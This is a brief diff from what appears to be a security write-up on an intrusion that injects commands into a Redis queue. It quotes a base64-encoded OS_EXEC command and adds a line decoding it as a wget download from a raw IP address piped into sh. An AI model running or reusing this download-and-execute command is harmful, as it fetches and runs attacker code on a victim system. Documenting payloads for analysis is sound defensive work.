@@ -99,4 +99,5 @@ Significant information disclosure
 - Injects into Redis queue
 
 Command: `OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb`
+
 Decoded payload: `wget http://185.202.2.147/h4Pln4/run.sh -O- | sh`
